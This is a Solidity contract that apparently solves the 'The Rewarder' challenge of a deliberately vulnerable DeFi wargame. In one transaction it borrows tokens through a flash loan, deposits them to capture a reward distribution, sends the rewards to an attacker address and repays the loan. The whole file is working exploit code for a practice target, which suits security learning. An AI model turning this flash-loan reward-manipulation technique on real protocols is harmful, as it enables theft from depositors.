// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

/**
 * @title RewarderAttacker
 * @author soyccan (soyccan@gmail.com)
 * @notice Tilt the rewarder pool for an instant through flash loans and exploit huge rewards
 */
contract RewarderAttacker {
    TheRewarderPool private immutable rewarderPool;
    FlashLoanerPool private immutable flashLoanPool;
    DamnValuableToken private immutable liquidityToken;
    RewardToken private immutable rewardToken;
    address private immutable attacker;

    constructor(
        address rewarderPoolAddr,
        address flashLoanPoolAddr,
        address liquidityTokenAddr,
        address rewardTokenAddr,
        address attackerAddr
    ) {
        rewarderPool = TheRewarderPool(rewarderPoolAddr);
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddr);
        liquidityToken = DamnValuableToken(liquidityTokenAddr);
        rewardToken = RewardToken(rewardTokenAddr);
        attacker = attackerAddr;
    }

    function receiveFlashLoan(uint256 amount) external {
        // deposit borrowed tokens into the rewarder pool
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // receive rewards
        rewarderPool.distributeRewards();
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));

        // repay the loan
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }
}
